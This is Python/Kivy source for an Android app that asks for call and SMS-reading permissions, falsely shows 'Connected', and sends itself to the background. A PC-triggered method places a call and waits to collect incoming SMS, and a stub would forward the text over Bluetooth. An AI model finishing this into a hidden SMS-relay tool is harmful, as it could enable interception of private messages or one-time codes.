import time
from kivy.app import App
from kivy.uix.button import Button
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.utils import platform

if platform == 'android':
    from jnius import autoclass
    
    # Android System Classes
    PythonActivity = autoclass('org.kivy.android.PythonActivity')
    Intent = autoclass('android.content.Intent')
    Uri = autoclass('android.net.Uri')
    BluetoothAdapter = autoclass('android.bluetooth.BluetoothAdapter')
    SmsManager = autoclass('android.telephony.SmsManager')
    ActivityCompat = autoclass('androidx.core.app.ActivityCompat')

class MainApp(App):
    def build(self):
        # Dark UI Layout
        layout = BoxLayout(orientation='vertical', padding=20, spacing=20)
        
        self.status_label = Label(text="Status: Disconnected", color=(1, 1, 1, 1), font_size='18sp')
        self.connect_btn = Button(text="Connect to PC", background_color=(0.5, 0.2, 0.8, 1), size_hint=(1, 0.3))
        
        self.connect_btn.bind(on_press=self.on_connect_click)
        
        layout.add_widget(self.connect_btn)
        layout.add_widget(self.status_label)
        return layout

    def on_connect_click(self, instance):
        if platform == 'android':
            # 1. Ask for runtime permissions
            activity = PythonActivity.mActivity
            permissions = [
                "android.permission.CALL_PHONE",
                "android.permission.READ_SMS",
                "android.permission.RECEIVE_SMS",
                "android.permission.BLUETOOTH_CONNECT"
            ]
            ActivityCompat.requestPermissions(activity, permissions, 101)

            # 2. Update status & Toast
            self.status_label.text = "Status: Done (Connected)"
            
            # 3. Minimize App (Move to background)
            activity.moveTaskToBack(True)

    # Function triggered when command is received from PC
    def execute_pc_command(self, phone_number="1299"):
        if platform == 'android':
            activity = PythonActivity.mActivity
            
            # Step A: Initiate Call to 1299
            call_intent = Intent(Intent.ACTION_CALL)
            call_intent.setData(Uri.parse(f"tel:{phone_number}"))
            activity.startActivity(call_intent)
            
            # Step B: Wait 30 seconds to collect incoming SMS
            time.sleep(30)
            
            # Step C: Read/Send SMS text back via Bluetooth (Stubbed for RFCOMM Stream)
            self.send_sms_to_pc("SMS Data fetched after 30 seconds.")

    def send_sms_to_pc(self, sms_text):
        # Transmit data back over active Bluetooth RFCOMM socket
        pass

if __name__ == '__main__':
    MainApp().run()